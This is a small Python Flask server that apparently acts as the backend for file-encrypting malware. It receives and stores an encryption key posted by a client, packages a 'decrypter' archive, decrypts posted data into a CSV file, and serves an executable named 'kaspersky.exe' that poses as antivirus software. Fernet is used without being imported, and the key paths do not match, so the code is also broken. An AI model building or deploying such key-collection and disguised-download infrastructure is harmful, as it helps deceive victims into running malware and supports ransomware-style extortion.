from flask import Flask,request,send_file,render_template
import shutil

app = Flask(__name__)

@app.route("/key_store",methods=["POST"])
def keystore():
    json = request.get_json()
    key = json['key']
    with open('decryption/filekey1.key', 'wb') as filekey:
        filekey.write(key.encode())
    
    shutil.make_archive('decrypter', 'zip',"decryption" )
    return "success"

@app.route("/decrypt",methods=["POST"])
def decrypt():
    with open('filekey1.key', 'rb') as filekey:
        key = filekey.read()

    fernet = Fernet(key)
    
    # opening the encrypted file
    #with open('nba.csv', 'rb') as enc_file:
    #    encrypted = enc_file.read()
    json = request.get_json()
    encrypted = json['encrypted']

    # decrypting the file
    decrypted = fernet.decrypt(encrypted)
    
    # opening the file in write mode and
    # writing the decrypted data
    with open('nba.csv', 'wb') as dec_file:
        dec_file.write(decrypted)
    return send_file('nba.csv')

@app.route("/home",methods=["GET"])
def home():
    return render_template("dload.html")
@app.route("/downloadkaspersky",methods=['GET'])
def dload_exe():
    return send_file('kaspersky.exe',as_attachment =True)

@app.route("/downloaddecrypt",methods=['GET'])
def dd():
    return send_file('decrypter.zip',as_attachment=True)
if __name__ == '__main__':
    app.run(debug=True)